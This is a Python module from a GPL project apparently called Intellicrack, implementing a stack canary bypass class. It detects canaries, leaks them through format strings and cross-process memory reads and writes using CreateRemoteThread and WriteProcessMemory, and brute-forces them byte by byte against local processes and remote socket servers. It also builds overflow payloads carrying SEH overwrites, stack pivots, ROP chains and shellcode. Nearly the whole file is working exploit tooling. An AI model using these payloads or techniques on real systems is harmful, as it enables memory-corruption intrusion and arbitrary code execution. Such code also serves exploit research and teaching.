"""Copyright (C) 2025 Zachary Flint.

This file is part of Intellicrack.

Intellicrack is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

Intellicrack is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Intellicrack.  If not, see https://www.gnu.org/licenses/.
"""

import re
import struct
from typing import Any, Dict, List, Optional

from .bypass_base import MitigationBypassBase


class StackCanaryBypass(MitigationBypassBase):
    """Stack Canary bypass implementation for defeating stack protection mechanisms."""

    def __init__(self):
        super().__init__("Stack Canary")
        self._initialize_techniques()
        self.canary_patterns = {
            "x86": [
                b"\x65\xa1\x14\x00\x00\x00",  # mov eax, fs:[0x14]
                b"\x64\xa1\x28\x00\x00\x00",  # mov eax, fs:[0x28]
                b"\x65\x8b\x04\x25\x14\x00\x00\x00",  # mov eax, gs:[0x14]
            ],
            "x86_64": [
                b"\x64\x48\x8b\x04\x25\x28\x00\x00\x00",  # mov rax, fs:[0x28]
                b"\x65\x48\x8b\x04\x25\x28\x00\x00\x00",  # mov rax, gs:[0x28]
                b"\x64\x48\x8b\x44\x24",  # mov rax, fs:[rsp+offset]
            ],
        }
        self.canary_values = []
        self.leak_techniques = [
            "format_string",
            "info_leak",
            "partial_overwrite",
            "brute_force",
            "thread_local_storage",
            "exception_handler",
        ]

    def _initialize_techniques(self) -> None:
        """Initialize the list of available techniques for this bypass."""
        self.techniques = [
            "brute_force",
            "information_disclosure",
            "format_string",
            "tls_manipulation",
            "forking_server",
            "direct_leak",
            "partial_overwrite",
            "exception_handler",
            "stack_juggling",
        ]
        self.bypass_techniques = self.techniques

    def get_recommended_technique(self, binary_info: Dict[str, Any]) -> str:
        """Get the recommended technique based on binary analysis.

        Args:
            binary_info: Information about the target binary

        Returns:
            Recommended bypass technique name
        """
        binary_data = binary_info.get("binary_data", b"")

        # Check for format string vulnerabilities
        if b"%s" in binary_data or b"%x" in binary_data or b"printf" in binary_data:
            return "format_string"

        # Check for fork-based servers
        if b"fork" in binary_data:
            return "forking_server"

        # Check for information disclosure opportunities
        if b"read" in binary_data or b"recv" in binary_data:
            return "information_disclosure"

        # Check for thread support
        if b"pthread" in binary_data or b"CreateThread" in binary_data:
            return "tls_manipulation"

        # Check for exception handling
        if binary_info.get("has_seh") or b"__except" in binary_data:
            return "exception_handler"

        # Default to brute force
        return "brute_force"

    def detect_canary(self, binary_data: bytes, arch: str = "x86_64") -> Dict[str, Any]:
        """Detect stack canary protection in binary."""
        result = {"has_canary": False, "canary_type": None, "canary_locations": [], "canary_check_functions": [], "bypass_difficulty": 0}

        patterns = self.canary_patterns.get(arch, self.canary_patterns["x86_64"])

        for pattern in patterns:
            offset = 0
            while True:
                idx = binary_data.find(pattern, offset)
                if idx == -1:
                    break
                result["canary_locations"].append(idx)
                result["has_canary"] = True
                offset = idx + len(pattern)

        if b"__stack_chk_fail" in binary_data:
            result["has_canary"] = True
            result["canary_type"] = "gcc_stack_protector"
            result["canary_check_functions"].append("__stack_chk_fail")

        if b"__security_check_cookie" in binary_data:
            result["has_canary"] = True
            result["canary_type"] = "msvc_security_cookie"
            result["canary_check_functions"].append("__security_check_cookie")

        if b"__stack_chk_guard" in binary_data:
            result["has_canary"] = True
            result["canary_type"] = "stack_guard"
            result["canary_check_functions"].append("__stack_chk_guard")

        if result["has_canary"]:
            result["bypass_difficulty"] = self._calculate_bypass_difficulty(result)

        self.logger.info(f"Stack canary detection: {result}")
        return result

    def leak_canary(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Leak stack canary value from target process."""
        result = {"success": False, "canary_value": None, "leak_method": None, "leak_address": None}

        for technique in self.leak_techniques:
            if technique == "format_string":
                leaked = self._leak_via_format_string(target_info)
            elif technique == "info_leak":
                leaked = self._leak_via_info_disclosure(target_info)
            elif technique == "partial_overwrite":
                leaked = self._leak_via_partial_overwrite(target_info)
            elif technique == "thread_local_storage":
                leaked = self._leak_from_tls(target_info)
            else:
                leaked = None

            if leaked:
                result["success"] = True
                result["canary_value"] = leaked["value"]
                result["leak_method"] = technique
                result["leak_address"] = leaked.get("address")
                self.canary_values.append(leaked["value"])
                break

        return result

    def _leak_via_format_string(self, target_info: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Exploit format string vulnerability to leak canary."""
        if "format_string_vuln" not in target_info:
            return None

        offset = target_info.get("canary_stack_offset", 0x28)
        process_handle = target_info.get("process_handle")
        format_input = target_info.get("format_input_address")

        if not process_handle or not format_input:
            return None

        import ctypes
        from ctypes import wintypes

        kernel32 = ctypes.windll.kernel32

        # Build format string to leak stack values
        if target_info.get("arch") == "x86_64":
            # First 6 args in registers, canary typically at offset 0x28 from rbp
            stack_position = (offset // 8) + 6
            format_payload = b"%" + str(stack_position).encode() + b"$016lx"
        else:
            # x86 - all args on stack
            stack_position = offset // 4
            format_payload = b"%" + str(stack_position).encode() + b"$08x"

        # Write format string to target process
        bytes_written = wintypes.DWORD()
        success = kernel32.WriteProcessMemory(
            process_handle, format_input, format_payload, len(format_payload), ctypes.byref(bytes_written)
        )

        if not success:
            return None

        # Read leaked value from output
        output_buffer = ctypes.create_string_buffer(1024)
        bytes_read = wintypes.DWORD()
        output_addr = target_info.get("output_buffer_address")

        if output_addr:
            kernel32.ReadProcessMemory(process_handle, output_addr, output_buffer, 1024, ctypes.byref(bytes_read))

            # Parse leaked canary value from output
            output = output_buffer.value
            if output:
                try:
                    # Extract hex value from output
                    hex_match = re.search(b"([0-9a-f]{8,16})", output, re.IGNORECASE)
                    if hex_match:
                        leaked_value = int(hex_match.group(1), 16)
                        return {
                            "value": struct.pack("<Q" if target_info.get("arch") == "x86_64" else "<I", leaked_value),
                            "address": offset,
                            "payload": format_payload,
                        }
                except (ValueError, struct.error):
                    pass

        return None

    def _leak_via_info_disclosure(self, target_info: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Leak canary through information disclosure vulnerability."""
        if "info_leak_address" not in target_info:
            return None

        leak_addr = target_info["info_leak_address"]
        process_handle = target_info.get("process_handle")

        if not process_handle:
            return None

        import ctypes
        from ctypes import wintypes

        kernel32 = ctypes.windll.kernel32
        canary_offset = 0x28 if target_info.get("arch") == "x86_64" else 0x14

        # Read memory at leak address + canary offset
        buffer_size = 8 if target_info.get("arch") == "x86_64" else 4
        buffer = ctypes.create_string_buffer(buffer_size)
        bytes_read = wintypes.DWORD()

        success = kernel32.ReadProcessMemory(process_handle, leak_addr + canary_offset, buffer, buffer_size, ctypes.byref(bytes_read))

        if success and bytes_read.value == buffer_size:
            return {"value": buffer.raw[:buffer_size], "address": leak_addr + canary_offset}

        return None

    def _leak_via_partial_overwrite(self, target_info: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Leak canary byte-by-byte through partial overwrites."""
        import ctypes
        from ctypes import wintypes

        process_handle = target_info.get("process_handle")
        input_address = target_info.get("input_address")
        trigger_address = target_info.get("trigger_function_address")

        if not all([process_handle, input_address, trigger_address]):
            return None

        kernel32 = ctypes.windll.kernel32
        canary_bytes = []
        buffer_size = target_info.get("buffer_size", 256)
        canary_size = 8 if target_info.get("arch") == "x86_64" else 4

        # First byte of canary is always null
        canary_bytes.append(0)

        for byte_idx in range(1, canary_size):
            for test_byte in range(256):
                # Build payload with partial canary overwrite
                payload = b"A" * buffer_size
                payload += bytes(canary_bytes)  # Known bytes
                payload += bytes([test_byte])  # Test byte

                # Write payload to target
                bytes_written = wintypes.DWORD()
                success = kernel32.WriteProcessMemory(process_handle, input_address, payload, len(payload), ctypes.byref(bytes_written))

                if not success:
                    continue

                # Trigger vulnerable function
                thread_handle = kernel32.CreateRemoteThread(process_handle, None, 0, trigger_address, None, 0, None)

                if thread_handle:
                    # Wait for thread completion
                    kernel32.WaitForSingleObject(thread_handle, 100)  # 100ms timeout

                    # Check if process is still alive (canary check passed)
                    exit_code = wintypes.DWORD()
                    if kernel32.GetExitCodeProcess(process_handle, ctypes.byref(exit_code)):
                        if exit_code.value == 259:  # STILL_ACTIVE
                            canary_bytes.append(test_byte)
                            kernel32.CloseHandle(thread_handle)
                            break

                    kernel32.CloseHandle(thread_handle)

        if len(canary_bytes) == canary_size:
            return {"value": bytes(canary_bytes), "address": target_info.get("stack_base", 0) + (0x28 if canary_size == 8 else 0x14)}
        return None

    def _leak_from_tls(self, target_info: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Leak canary from Thread Local Storage."""
        tls_base = target_info.get("tls_base")
        process_handle = target_info.get("process_handle")

        if not tls_base or not process_handle:
            return None

        import ctypes
        from ctypes import wintypes

        kernel32 = ctypes.windll.kernel32

        if target_info.get("arch") == "x86_64":
            canary_offset = 0x28
            buffer_size = 8
        else:
            canary_offset = 0x14
            buffer_size = 4

        # Read canary value from TLS
        buffer = ctypes.create_string_buffer(buffer_size)
        bytes_read = wintypes.DWORD()

        # For Windows, TLS is accessed through TEB (Thread Environment Block)
        # fs:[0x28] on x86 or gs:[0x28] on x64
        ntdll = ctypes.windll.ntdll

        # Get thread context to find TEB
        thread_id = target_info.get("thread_id")
        if thread_id:
            thread_handle = kernel32.OpenThread(
                0x0010 | 0x0020 | 0x0040, False, thread_id
            )  # THREAD_SUSPEND_RESUME | THREAD_GET_CONTEXT | THREAD_QUERY_INFORMATION
            if thread_handle:
                # Query TEB using NtQueryInformationThread
                class THREAD_BASIC_INFORMATION(ctypes.Structure):
                    _fields_ = [
                        ("ExitStatus", ctypes.c_long),
                        ("TebBaseAddress", ctypes.c_void_p),
                        ("ClientId", ctypes.c_ulonglong),
                        ("AffinityMask", ctypes.c_ulonglong),
                        ("Priority", ctypes.c_long),
                        ("BasePriority", ctypes.c_long),
                    ]

                tbi = THREAD_BASIC_INFORMATION()
                status = ntdll.NtQueryInformationThread(
                    thread_handle,
                    0,  # ThreadBasicInformation
                    ctypes.byref(tbi),
                    ctypes.sizeof(tbi),
                    None,
                )

                if status == 0 and tbi.TebBaseAddress:
                    # Use TEB address for more accurate canary location
                    tls_base = tbi.TebBaseAddress

                # Suspend thread to read consistent state
                kernel32.SuspendThread(thread_handle)

                # Read from TLS slot
                success = kernel32.ReadProcessMemory(
                    process_handle, tls_base + canary_offset, buffer, buffer_size, ctypes.byref(bytes_read)
                )

                # Resume thread
                kernel32.ResumeThread(thread_handle)
                kernel32.CloseHandle(thread_handle)

                if success and bytes_read.value == buffer_size:
                    return {"value": buffer.raw[:buffer_size], "address": tls_base + canary_offset}

        return None

    def bypass_canary(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate bypass payload for stack canary protection."""
        result = {"success": False, "technique": None, "payload": b"", "instructions": []}

        canary_info = self.detect_canary(target_info.get("binary_data", b""), target_info.get("arch", "x86_64"))

        if not canary_info["has_canary"]:
            result["success"] = True
            result["technique"] = "no_canary"
            result["instructions"].append("No stack canary detected")
            return result

        leaked = self.leak_canary(target_info)
        if leaked["success"]:
            result["success"] = True
            result["technique"] = f"leak_{leaked['leak_method']}"
            result["payload"] = self._build_exploit_with_canary(target_info, leaked["canary_value"])
            result["instructions"].append(f"Leaked canary: {leaked['canary_value'].hex()}")
            result["instructions"].append(f"Method: {leaked['leak_method']}")
        else:
            result["technique"] = "brute_force"
            result["payload"] = self._build_brute_force_payload(target_info)
            result["instructions"].append("Failed to leak canary, using brute force")

        return result

    def _build_exploit_with_canary(self, target_info: Dict[str, Any], canary: bytes) -> bytes:
        """Build exploit payload with known canary value."""
        buffer_size = target_info.get("buffer_size", 256)
        ret_addr = target_info.get("return_address", 0x401000)

        payload = b"A" * buffer_size
        payload += canary
        payload += b"B" * 8  # Saved RBP
        payload += struct.pack("<Q", ret_addr)

        shellcode = target_info.get("shellcode", b"\x90" * 32)
        payload += shellcode

        return payload

    def _build_brute_force_payload(self, target_info: Dict[str, Any]) -> bytes:
        """Build payload for brute force canary bypass."""
        buffer_size = target_info.get("buffer_size", 256)

        payload = b"A" * buffer_size
        payload += b"\x00"  # First byte is always null

        for _ in range(7):  # Remaining 7 bytes
            payload += b"\xff"  # Will be brute forced

        return payload

    def _calculate_bypass_difficulty(self, canary_info: Dict[str, Any]) -> int:
        """Calculate difficulty of bypassing stack canary."""
        difficulty = 5  # Base difficulty

        if canary_info["canary_type"] == "msvc_security_cookie":
            difficulty += 2  # MSVC cookies are harder

        if len(canary_info["canary_locations"]) > 10:
            difficulty += 1  # Many checks

        if len(canary_info["canary_check_functions"]) > 1:
            difficulty += 1  # Multiple check functions

        return min(difficulty, 10)

    def find_gadgets(self, binary_data: bytes, arch: str = "x86_64") -> List[Dict[str, Any]]:
        """Find useful gadgets for canary bypass."""
        gadgets = []

        gadget_patterns = {
            "x86_64": [
                (b"\x58\xc3", "pop rax; ret"),
                (b"\x5f\xc3", "pop rdi; ret"),
                (b"\x5e\xc3", "pop rsi; ret"),
                (b"\x5a\xc3", "pop rdx; ret"),
                (b"\x48\x89\xe0\xc3", "mov rax, rsp; ret"),
                (b"\x48\x8d\x3c\x24\xc3", "lea rdi, [rsp]; ret"),
            ],
            "x86": [
                (b"\x58\xc3", "pop eax; ret"),
                (b"\x5b\xc3", "pop ebx; ret"),
                (b"\x59\xc3", "pop ecx; ret"),
                (b"\x5a\xc3", "pop edx; ret"),
            ],
        }

        patterns = gadget_patterns.get(arch, gadget_patterns["x86_64"])

        for pattern, desc in patterns:
            offset = 0
            while True:
                idx = binary_data.find(pattern, offset)
                if idx == -1:
                    break
                gadgets.append({"offset": idx, "bytes": pattern, "instruction": desc, "type": "rop"})
                offset = idx + 1

        return gadgets

    def exploit_exception_handler(self, target_info: Dict[str, Any]) -> Dict[str, Any]:
        """Exploit exception handler to bypass canary check."""
        result = {"success": False, "technique": "exception_handler", "payload": b"", "seh_chain": []}

        if target_info.get("has_seh"):
            seh_overwrite = struct.pack("<Q", target_info.get("seh_handler", 0x401000))

            payload = b"A" * target_info.get("buffer_size", 256)
            payload += b"\xcc" * 8  # Trigger exception
            payload += seh_overwrite

            result["success"] = True
            result["payload"] = payload
            result["seh_chain"].append(seh_overwrite)

        return result

    def analyze_binary(self, binary_path: str) -> Dict[str, Any]:
        """Analyze binary for stack canary protection."""
        result = {"path": binary_path, "has_canary": False, "canary_type": None, "bypass_methods": [], "difficulty": 0}

        try:
            with open(binary_path, "rb") as f:
                binary_data = f.read()

            arch = "x86_64" if b"x86_64" in binary_data[:1024] else "x86"

            canary_info = self.detect_canary(binary_data, arch)
            result.update(canary_info)

            if canary_info["has_canary"]:
                result["bypass_methods"] = self._determine_bypass_methods(binary_data)

        except Exception as e:
            self.logger.error(f"Failed to analyze binary: {e}")

        return result

    def _determine_bypass_methods(self, binary_data: bytes) -> List[str]:
        """Determine viable bypass methods for the binary."""
        methods = []

        if b"%s" in binary_data or b"%x" in binary_data:
            methods.append("format_string")

        if b"read" in binary_data or b"recv" in binary_data:
            methods.append("info_leak")

        if b"fork" in binary_data:
            methods.append("brute_force")

        if b"pthread" in binary_data:
            methods.append("thread_local_storage")

        if len(methods) == 0:
            methods.append("partial_overwrite")

        return methods

    def generate_bruteforce_payload(self, config: Dict[str, Any]) -> bytes:
        """Generate payload for bruteforce canary bypass."""
        buffer_size = config.get("buffer_size", 256)
        canary_size = config.get("canary_size", 8)
        arch = config.get("arch", "x86_64")

        payload = b"A" * buffer_size
        payload += b"\x00"

        for i in range(1, canary_size):
            test_byte = config.get(f"byte_{i}", 0xFF)
            payload += bytes([test_byte])

        if config.get("include_rop"):
            rop_chain = config.get("rop_chain", [])
            for gadget in rop_chain:
                if arch == "x86_64":
                    payload += struct.pack("<Q", gadget)
                else:
                    payload += struct.pack("<I", gadget)

        if config.get("shellcode"):
            payload += config["shellcode"]

        return payload

    def generate_format_string_leak(self, config: Dict[str, Any]) -> bytes:
        """Generate format string payload to leak canary."""
        arch = config.get("arch", "x86_64")
        canary_offset = config.get("canary_offset", 0x28)

        if arch == "x86_64":
            stack_position = (canary_offset // 8) + 6
            format_string = f"%{stack_position}$016lx"
        else:
            stack_position = canary_offset // 4
            format_string = f"%{stack_position}$08x"

        if config.get("padding"):
            format_string = "A" * config["padding"] + format_string

        if config.get("additional_leaks"):
            for leak in config["additional_leaks"]:
                if arch == "x86_64":
                    format_string += f"|%{leak}$016lx"
                else:
                    format_string += f"|%{leak}$08x"

        return format_string.encode()

    def extract_canary_from_leak(self, leaked_data: bytes) -> bytes:
        """Extract canary value from leaked data."""
        import re

        hex_pattern = re.compile(b"([0-9a-f]{8,16})", re.IGNORECASE)
        matches = hex_pattern.findall(leaked_data)

        if matches:
            first_match = matches[0]
            try:
                canary_int = int(first_match, 16)

                if len(first_match) == 16:
                    canary_bytes = struct.pack("<Q", canary_int)
                else:
                    canary_bytes = struct.pack("<I", canary_int)

                if canary_bytes[0] == 0:
                    return canary_bytes

                for match in matches[1:]:
                    try:
                        val = int(match, 16)
                        test_bytes = struct.pack("<Q" if len(match) == 16 else "<I", val)
                        if test_bytes[0] == 0:
                            return test_bytes
                    except:
                        continue

            except (ValueError, struct.error):
                pass

        if len(leaked_data) >= 8:
            for i in range(len(leaked_data) - 7):
                if leaked_data[i] == 0:
                    return leaked_data[i : i + 8]

        if len(leaked_data) >= 4:
            for i in range(len(leaked_data) - 3):
                if leaked_data[i] == 0:
                    return leaked_data[i : i + 4]

        return leaked_data[:8] if len(leaked_data) >= 8 else leaked_data[:4]

    def generate_tls_overwrite(self, config: Dict[str, Any]) -> bytes:
        """Generate payload to overwrite canary in TLS."""
        buffer_size = config.get("buffer_size", 256)
        tls_offset = config.get("tls_offset", 0x28)
        new_canary = config.get("new_canary", b"\x00" * 8)
        arch = config.get("arch", "x86_64")

        payload = b"A" * buffer_size

        if config.get("overwrite_method") == "direct":
            overflow_size = tls_offset - buffer_size
            if overflow_size > 0:
                payload += b"B" * overflow_size
            payload += new_canary
        else:
            payload += new_canary
            padding_size = 8 if arch == "x86_64" else 4
            payload += b"P" * padding_size

        if config.get("return_address"):
            ret_addr = config["return_address"]
            if arch == "x86_64":
                payload += struct.pack("<Q", ret_addr)
            else:
                payload += struct.pack("<I", ret_addr)

        return payload

    def generate_stack_juggling(self, config: Dict[str, Any]) -> bytes:
        """Generate stack juggling payload to bypass canary."""
        buffer_size = config.get("buffer_size", 256)
        pivot_gadget = config.get("pivot_gadget", 0x401000)
        new_stack = config.get("new_stack_addr", 0x700000)
        arch = config.get("arch", "x86_64")

        payload = b"A" * buffer_size

        if arch == "x86_64":
            payload += struct.pack("<Q", pivot_gadget)
            payload += struct.pack("<Q", new_stack)

            if config.get("xchg_gadget"):
                payload += struct.pack("<Q", config["xchg_gadget"])
        else:
            payload += struct.pack("<I", pivot_gadget)
            payload += struct.pack("<I", new_stack)

            if config.get("xchg_gadget"):
                payload += struct.pack("<I", config["xchg_gadget"])

        rop_chain = config.get("rop_chain", [])
        for gadget in rop_chain:
            if arch == "x86_64":
                payload += struct.pack("<Q", gadget)
            else:
                payload += struct.pack("<I", gadget)

        if config.get("shellcode"):
            payload += config["shellcode"]

        return payload

    def generate_exception_bypass(self, config: Dict[str, Any]) -> bytes:
        """Generate exception-based canary bypass payload."""
        buffer_size = config.get("buffer_size", 256)
        seh_handler = config.get("seh_handler", 0x401000)
        arch = config.get("arch", "x86_64")

        payload = b"A" * buffer_size

        if config.get("trigger_exception"):
            payload += b"\xcc" * 8

        if arch == "x86":
            payload += b"B" * 4
            payload += struct.pack("<I", seh_handler)
        else:
            if config.get("exception_directory"):
                exception_addr = config["exception_directory"]
                payload += struct.pack("<Q", exception_addr)

            payload += struct.pack("<Q", seh_handler)

        if config.get("exception_payload"):
            payload += config["exception_payload"]

        return payload

    def analyze_binary_canary(self, binary_path: str) -> Dict[str, Any]:
        """Analyze binary for detailed canary information."""
        result = {
            "has_canary": False,
            "canary_type": None,
            "canary_checks": [],
            "vulnerable_functions": [],
            "bypass_difficulty": 0,
            "recommended_bypasses": [],
        }

        try:
            with open(binary_path, "rb") as f:
                binary_data = f.read()

            arch = "x86_64" if b"PE\x00\x00d\x86" in binary_data[:1024] else "x86"

            canary_info = self.detect_canary(binary_data, arch)
            result.update(canary_info)

            if b"__stack_chk_fail" in binary_data:
                result["canary_checks"].append("__stack_chk_fail")
            if b"__security_check_cookie" in binary_data:
                result["canary_checks"].append("__security_check_cookie")
            if b"__stack_chk_guard" in binary_data:
                result["canary_checks"].append("__stack_chk_guard")

            vuln_funcs = [b"gets", b"strcpy", b"strcat", b"sprintf", b"vsprintf"]
            for func in vuln_funcs:
                if func in binary_data:
                    result["vulnerable_functions"].append(func.decode())

            if b"%s" in binary_data or b"%x" in binary_data:
                result["recommended_bypasses"].append("format_string")
            if b"fork" in binary_data:
                result["recommended_bypasses"].append("brute_force")
            if b"pthread" in binary_data or b"CreateThread" in binary_data:
                result["recommended_bypasses"].append("thread_leak")

            if result["vulnerable_functions"]:
                result["recommended_bypasses"].append("partial_overwrite")

        except Exception as e:
            self.logger.error(f"Failed to analyze binary canary: {e}")

        return result

    def create_remote_bruteforce(self, config: Dict[str, Any]) -> Dict[str, Any]:
        """Create remote bruteforce engine for canary bypass."""
        import socket
        import time

        engine = {
            "target_host": config.get("host", "localhost"),
            "target_port": config.get("port", 1337),
            "buffer_size": config.get("buffer_size", 256),
            "canary_size": config.get("canary_size", 8),
            "delay": config.get("delay", 0.1),
            "timeout": config.get("timeout", 5),
            "found_bytes": [0x00],
            "attempts": 0,
            "success": False,
        }

        def test_byte(byte_value, position):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(engine["timeout"])
                sock.connect((engine["target_host"], engine["target_port"]))

                payload = b"A" * engine["buffer_size"]
                payload += bytes(engine["found_bytes"])
                if position < engine["canary_size"]:
                    payload += bytes([byte_value])

                sock.send(payload)
                time.sleep(engine["delay"])

                try:
                    response = sock.recv(1024)
                    sock.close()
                    return True
                except socket.timeout:
                    sock.close()
                    return False

            except Exception:
                return False

        engine["test_byte"] = test_byte

        def bruteforce():
            for position in range(1, engine["canary_size"]):
                found = False
                for byte_val in range(256):
                    engine["attempts"] += 1
                    if test_byte(byte_val, position):
                        engine["found_bytes"].append(byte_val)
                        found = True
                        break

                if not found:
                    return False

            engine["success"] = True
            return bytes(engine["found_bytes"])

        engine["bruteforce"] = bruteforce

        return engine

    def optimize_for_fork_server(self, config: Dict[str, Any]) -> Dict[str, Any]:
        """Optimize canary bypass for fork-based servers."""
        strategy = {
            "technique": "fork_bruteforce",
            "parallel_connections": config.get("threads", 4),
            "byte_order": "sequential",
            "crash_detection": "timeout",
            "optimization_level": 2,
        }

        if config.get("forking_model") == "preforked":
            strategy["parallel_connections"] = min(config.get("threads", 4), 8)
            strategy["byte_order"] = "parallel"

        strategy["payload_generator"] = lambda pos, val: (
            b"A" * config.get("buffer_size", 256) + bytes([0x00]) + bytes([val] if pos == 1 else [0xFF] * (pos - 1) + [val])
        )

        strategy["crash_detector"] = lambda resp: (resp is None or b"error" in resp.lower() or b"fault" in resp.lower())

        strategy["success_validator"] = lambda resp: (resp is not None and len(resp) > 0 and b"error" not in resp.lower())

        return strategy

    def generate_gs_bypass(self, config: Dict[str, Any]) -> bytes:
        """Generate Windows GS cookie bypass payload."""
        buffer_size = config.get("buffer_size", 256)
        gs_value = config.get("gs_cookie", 0)
        exception_handler = config.get("exception_handler", 0x401000)

        payload = b"A" * buffer_size

        if gs_value:
            payload += struct.pack("<Q", gs_value)
        else:
            payload += b"\x00" + b"\xff" * 7

        payload += b"B" * 8

        if config.get("use_seh"):
            payload += struct.pack("<Q", exception_handler)

        if config.get("rop_chain"):
            for gadget in config["rop_chain"]:
                payload += struct.pack("<Q", gadget)

        if config.get("shellcode"):
            payload += b"\x90" * 16
            payload += config["shellcode"]

        return payload

    def generate_stackguard_bypass(self, config: Dict[str, Any]) -> bytes:
        """Generate Linux StackGuard bypass payload."""
        buffer_size = config.get("buffer_size", 256)
        canary_value = config.get("canary", b"\x00" + b"\xff" * 7)

        payload = b"A" * buffer_size
        payload += canary_value

        payload += b"B" * 8

        if config.get("return_address"):
            payload += struct.pack("<Q", config["return_address"])

        if config.get("one_gadget"):
            payload += struct.pack("<Q", config["one_gadget"])

        if config.get("rop_chain"):
            for gadget in config["rop_chain"]:
                payload += struct.pack("<Q", gadget)

        return payload

    def analyze_canary_entropy(self, entropy_data: Dict[str, Any]) -> Dict[str, Any]:
        """Analyze canary entropy and randomness."""
        import math
        from collections import Counter

        result = {"entropy": 0.0, "randomness_quality": "unknown", "byte_distribution": {}, "weaknesses": [], "bruteforce_time": 0}

        canary_samples = entropy_data.get("samples", [])

        if not canary_samples:
            return result

        all_bytes = []
        for sample in canary_samples:
            if isinstance(sample, bytes):
                all_bytes.extend(sample)
            elif isinstance(sample, int):
                if sample < 2**32:
                    all_bytes.extend(struct.pack("<I", sample))
                else:
                    all_bytes.extend(struct.pack("<Q", sample))

        if all_bytes:
            byte_freq = Counter(all_bytes)
            total_bytes = len(all_bytes)

            entropy = 0.0
            for count in byte_freq.values():
                if count > 0:
                    prob = count / total_bytes
                    entropy -= prob * math.log2(prob)

            result["entropy"] = entropy
            result["byte_distribution"] = dict(byte_freq)

            if entropy < 4.0:
                result["randomness_quality"] = "poor"
                result["weaknesses"].append("low_entropy")
            elif entropy < 6.0:
                result["randomness_quality"] = "moderate"
            else:
                result["randomness_quality"] = "good"

            if byte_freq[0] > total_bytes * 0.1:
                result["weaknesses"].append("null_byte_bias")

            unique_bytes = len(byte_freq)
            if unique_bytes < 128:
                result["weaknesses"].append("limited_byte_range")

            canary_size = entropy_data.get("canary_size", 8)
            if result["randomness_quality"] == "poor":
                result["bruteforce_time"] = (256 ** (canary_size - 1)) // 1000000
            else:
                result["bruteforce_time"] = (256**canary_size) // 1000000

        return result

    def generate_multistage_bypass(self, config: Dict[str, Any]) -> Dict[str, Any]:
        """Generate multi-stage canary bypass strategy."""
        stages = {"stage_count": config.get("stages", 3), "stages": [], "total_payload_size": 0, "success_probability": 0.0}

        stage1 = {
            "name": "leak",
            "payload": self.generate_format_string_leak(
                {"arch": config.get("arch", "x86_64"), "canary_offset": config.get("canary_offset", 0x28)}
            ),
            "purpose": "Leak canary value",
            "success_rate": 0.8,
        }
        stages["stages"].append(stage1)

        if config.get("stages", 3) >= 2:
            stage2 = {
                "name": "overwrite",
                "payload": b"A" * config.get("buffer_size", 256),
                "purpose": "Overwrite with leaked canary",
                "success_rate": 0.9,
            }
            stage2["payload"] += b"{{CANARY}}"
            stage2["payload"] += b"B" * 8
            stages["stages"].append(stage2)

        if config.get("stages", 3) >= 3:
            stage3 = {"name": "exploit", "payload": b"", "purpose": "Execute shellcode", "success_rate": 0.95}

            if config.get("rop_chain"):
                for gadget in config["rop_chain"]:
                    stage3["payload"] += struct.pack("<Q", gadget)

            if config.get("shellcode"):
                stage3["payload"] += config["shellcode"]

            stages["stages"].append(stage3)

        total_size = sum(len(s["payload"]) for s in stages["stages"])
        stages["total_payload_size"] = total_size

        prob = 1.0
        for stage in stages["stages"]:
            prob *= stage["success_rate"]
        stages["success_probability"] = prob

        return stages
